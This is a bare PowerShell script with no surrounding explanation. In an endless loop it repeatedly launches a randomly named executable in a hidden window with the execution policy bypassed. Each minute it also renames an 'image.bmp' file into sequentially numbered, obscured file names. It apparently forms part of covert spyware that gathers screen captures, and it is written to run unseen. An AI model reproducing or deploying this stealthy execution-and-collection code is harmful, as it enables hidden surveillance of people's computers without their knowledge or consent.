$count=0
$curr_dir=(Get-Location).Path
while($true){
    powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden "$curr_dir\KJUwHZlCNV.exe"
    $file_name="TmreCWpLEnhx$count"
    while(Test-Path -Path "$curr_dir\$file_name"){
        $count++
    }
    Move-Item -Path "$curr_dir\image.bmp" -Destination "$curr_dir\$file_name"
    Start-Sleep -Seconds 60
}